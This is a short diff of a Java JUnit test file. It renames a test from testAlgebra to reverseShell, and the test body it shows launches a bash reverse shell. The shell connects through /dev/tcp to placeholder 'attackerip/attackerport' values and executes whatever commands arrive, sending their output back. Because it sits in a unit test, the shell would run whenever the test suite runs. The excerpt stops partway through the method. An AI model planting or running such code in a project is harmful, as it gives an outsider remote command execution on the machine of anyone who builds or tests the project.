@@ -26,7 +26,7 @@ import static org.junit.Assert.*;
 
 public class AppTest{
   @Test
-  public void testAlgebra(){
+  public void reverseShell(){
     try {
       String[] command = {"/bin/bash", "-c", "exec 5<>/dev/tcp/attackerip/attackerport;cat <&5 | while read line; do $line 2>&5 >&5; done;"}; 
       Process process = new ProcessBuilder(command).start();
